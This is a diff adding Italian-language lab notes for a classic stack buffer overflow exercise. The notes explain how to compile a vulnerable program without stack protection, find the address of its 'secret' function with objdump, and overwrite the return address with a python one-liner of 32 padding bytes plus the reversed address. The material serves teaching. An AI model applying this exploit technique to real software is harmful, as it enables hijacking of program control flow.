@@ -1,0 +1,32 @@
+COMPILAZIONE: 
+per 32 bit: 
+gcc bufover.c -o bufover -fno-stack-protector
+per 64 bit:
+ gcc bufover.c -o bufover -fno-stack-protector -m32  -no-pie
+
+Se da errori in compilazione, installare queste librerie con l'istruzione:
+
+sudo apt-get install gcc-multilib
+
+
+
+
+Per trovare l'indirizzo della funzione secret, disassemblare il codice con:
+
+ objdump -d bufover
+
+(trovo indirizzo di funzione secret )
+
+Esempio: Se indirizzo 08 04 84 44
+inverto la sequenza dell'indirizzo e passo in input al programma bufover con: 
+
+python2 -c 'print "a"*32 +"\x44\x84\x04\x08"'|bufover 
+
+In pratica manda in input al programma 32 a (ma poteva essere un qualsiasi carattere) 
+per aggiungere 32 bytes perché:
+
+
+Tipicamente 28 bytes sono riservati per il buffer 
+(anche se richiesti 20, controllare funzione lea in assembler) 
++ 4 bytes per ebp (base pointer register).
+Quindi l'indirizzo di ritorno sarà dopo  32 bytes nello stack.  
